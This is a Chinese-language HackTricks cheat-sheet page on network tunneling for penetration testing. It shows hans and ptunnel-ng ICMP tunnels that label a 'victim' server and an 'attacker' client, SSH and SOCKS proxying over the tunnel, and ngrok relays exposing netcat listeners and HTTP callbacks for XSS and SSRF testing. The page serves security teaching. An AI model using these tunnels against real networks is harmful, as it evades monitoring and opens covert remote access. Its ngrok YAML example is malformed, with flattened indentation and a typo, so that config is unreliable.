<h3 id="hans"><a class="header" href="#hans">Hans</a></h3>
<p><a href="https://github.com/friedrich/hans">https://github.com/friedrich/hans</a><br />
<a href="https://github.com/albertzak/hanstunnel">https://github.com/albertzak/hanstunnel</a></p>
<p>在两个系统中都需要 root 权限，以创建 tun 适配器并使用 ICMP 回显请求在它们之间隧道数据。</p>
<pre><code class="language-bash">./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
</code></pre>
<h3 id="ptunnel-ng"><a class="header" href="#ptunnel-ng">ptunnel-ng</a></h3>
<p><a href="https://github.com/utoni/ptunnel-ng.git"><strong>从这里下载</strong></a>。</p>
<pre><code class="language-bash"># Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p &lt;server_ip&gt; -l &lt;listen_port&gt; -r &lt;dest_ip&gt; -R &lt;dest_port&gt;
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
</code></pre>
<h2 id="ngrok"><a class="header" href="#ngrok">ngrok</a></h2>
<p><a href="https://ngrok.com/"><strong>ngrok</strong></a> <strong>是一个通过一条命令行将解决方案暴露到互联网的工具。</strong><br />
&amp;#xNAN;<em>Exposition URI 类似于：</em> <strong>UID.ngrok.io</strong></p>
<h3 id="安装"><a class="header" href="#安装">安装</a></h3>
<ul>
<li>创建一个账户： https://ngrok.com/signup</li>
<li>客户端下载：</li>
</ul>
<pre><code class="language-bash">tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
</code></pre>
<h3 id="基本用法"><a class="header" href="#基本用法">基本用法</a></h3>
<p><strong>文档:</strong> <a href="https://ngrok.com/docs/getting-started/">https://ngrok.com/docs/getting-started/</a>.</p>
<p><em>如果需要，也可以添加身份验证和TLS。</em></p>
<h4 id="隧道-tcp"><a class="header" href="#隧道-tcp">隧道 TCP</a></h4>
<pre><code class="language-bash"># Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
</code></pre>
<h4 id="通过http暴露文件"><a class="header" href="#通过http暴露文件">通过HTTP暴露文件</a></h4>
<pre><code class="language-bash">./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
</code></pre>
<h4 id="嗅探-http-调用"><a class="header" href="#嗅探-http-调用">嗅探 HTTP 调用</a></h4>
<p><em>对 XSS, SSRF, SSTI ... 有用</em><br />
直接从 stdout 或在 HTTP 接口 <a href="http://127.0.0.1:4000">http://127.0.0.1:4040</a>。</p>
<h4 id="隧道内部-http-服务"><a class="header" href="#隧道内部-http-服务">隧道内部 HTTP 服务</a></h4>
<pre><code class="language-bash">./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
</code></pre>
<h4 id="ngrokyaml-简单配置示例"><a class="header" href="#ngrokyaml-简单配置示例">ngrok.yaml 简单配置示例</a></h4>
<p>它打开 3 个隧道：</p>
<ul>
<li>2 个 TCP</li>
<li>1 个 HTTP，静态文件从 /tmp/httpbin/ 暴露</li>
</ul>
<pre><code class="language-yaml">tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
</code></pre>
<h2 id="其他检查工具"><a class="header" href="#其他检查工具">其他检查工具</a></h2>
<ul>
<li><a href="https://github.com/securesocketfunneling/ssf">https://github.com/securesocketfunneling/ssf</a></li>
<li><a href="https://github.com/z3APA3A/3proxy">https://github.com/z3APA3A/3proxy</a></li>
</ul>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../generic-hacking/search-exploits.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../linux-hardening/linux-privilege-escalation-checklist.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../generic-hacking/search-exploits.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../linux-hardening/linux-privilege-escalation-checklist.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
